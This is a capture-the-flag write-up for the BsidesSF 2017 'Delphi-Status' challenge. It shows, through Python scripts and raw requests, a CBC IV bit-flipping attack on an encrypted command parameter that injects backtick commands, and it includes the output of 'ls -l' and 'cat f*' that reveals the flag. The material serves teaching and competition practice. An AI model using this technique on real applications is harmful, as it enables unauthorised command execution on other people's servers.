# BsidesSF 2017 - Delphi-Status (web, 250 pts)

Although it was in the web category, it was more of a crypto challenge. It's a web app that allows you to click links which are obvisouly running system commands:

![N|Solid](https://i.imgur.com/skpPMdC.png)

The vulnerability can be exploited like a classic padding oracle. However, team [TheGoonies](https://thegoonies.rocks) took another approach to solve it.

When clicking on the "echo something" link, the requests looks like the following:
```
GET /execute/dc929db8d583f79becbfe00f6fe17e3680aef7b95a28afa7b314966442373f32f0da179bd12f5f676a5c896bda6f4673fb23f86d2efcb65ebd4892d7ba2b243cfecff573589ebf4ea3cec3f039c6c4a0595912c953a4f8e517c667eaba67800b914db22da7aae0c1cacf22790ed03949
```
Which returns: **This is a longer string that I want to use to test multiple-block patterns**

We quickly determine that the length of the ciphertext in the request equals exactly 7 blocks of 16 bytes.However the command line `echo "the_text"` is only 81 bytes, so the IV must be preprended to the command. What happens if we modify some of the first 16 bytes? We would modify the IV without breaking the actual decryption. For example, let's try and change the 9th byte. This should correspond to the letter `i` in `echo "This is...`. So we will change \xec to \x00:

```
GET /execute/dc929db8d583f79b00bfe00f6fe17e3680aef7b95a28afa7b314966442373f32f0da179bd12f5f676a5c896bda6f4673fb23f86d2efcb65ebd4892d7ba2b243cfecff573589ebf4ea3cec3f039c6c4a0595912c953a4f8e517c667eaba67800b914db22da7aae0c1cacf22790ed03949
```
That returns: **Th\x85s is a longer string that I want to use to test multiple-block patterns**

What does it tell us? That if we want to include an arbitrary character X in the decrypted text, we just have to XOR X with \x85! Let's confirm that by trying to include the letter 'A' in the output text. We will change the 8th byte to `\x41 ^ \x85` (\xc4):

```
GET /execute/dc929db8d583f79bc4bfe00f6fe17e3680aef7b95a28afa7b314966442373f32f0da179bd12f5f676a5c896bda6f4673fb23f86d2efcb65ebd4892d7ba2b243cfecff573589ebf4ea3cec3f039c6c4a0595912c953a4f8e517c667eaba67800b914db22da7aae0c1cacf22790ed03949
```
Response: **ThAs is a longer string that I want to use to test multiple-block patterns**

We're on track! So let's repeat that process for a length of 8 bytes (bytes 9 to 16). We use the simple script below, but it's easily done manually.

```python
block_1 = 'dc929db8d583f79b'
block_2 = '00' * 8
other_blocks = '80aef7b95a28afa7b314966442373f32f0da179bd12f5f676a5c896bda6f4673fb23f86d2efcb65ebd4892d7ba2b243cfecff573589ebf4ea3cec3f039c6c4a0595912c953a4f8e517c667eaba67800b914db22da7aae0c1cacf22790ed03949'
res = requests.get('http://delphi-status-e606c556.ctf.bsidessf.net/execute/%s' % block_1 + block_2 + other_blocks).content

decrypted_block = res[7:15]
sys.stdout.write(decrypted_block)
```
```
$ python script.py  | xxd
00000000: 85cc c066 1cc1 1f16
```

So we know that the decrypted block when xored with zeros is `\x85\xcc\xc0\x66\x1c\xc1\x1f\x16`, which mean we can control 8 bytes of decrypted text. Lucky for us, it's enough to create a payload that will let us execute commands! we can use the back ticks to escape from the `echo` and run arbitrary commands. Finally, we can solve the challenge like this:

```python
# Note: the argument must be exacly 6 bytes, + 2 backticks
assert len(sys.argv[1]) == 6
payload = '`%s`' % sys.argv[1]
decrypted_block = '\x85\xcc\xc0\x66\x1c\xc1\x1f\x16'

block_1 = 'dc929db8d583f79b'
other_blocks = '80aef7b95a28afa7b314966442373f32f0da179bd12f5f676a5c896bda6f4673fb23f86d2efcb65ebd4892d7ba2b243cfecff573589ebf4ea3cec3f039c6c4a0595912c953a4f8e517c667eaba67800b914db22da7aae0c1cacf22790ed03949'

x = xor(decrypted_block, payload).encode('hex')
print requests.get('http://delphi-status-e606c556.ctf.bsidessf.net/execute/%s' % block_1 + x + other_blocks).content
```
File listing:
```
$ python script.py "ls  -l"
<pre>Thtotal 16
-rw-r--r-- 4 root root   71 Feb 12 03:11 Gemfile
-rw-r--r-- 4 root root  329 Feb 12 03:11 Gemfile.lock
-rw-r--r-- 4 root root 1746 Feb 12 03:11 app.rb
-rw-r--r-- 4 root root   38 Feb 12 03:11 flag.txtlonger string that I want to use to test multiple-block patterns
</pre>
```
Get the flag:
```
$ python script.py "cat f*"
<pre>ThFLAG:a1cf81c5e0872a7e0a4aec2e8e9f74c3longer string that I want to use to test multiple-block patterns
</pre>
```
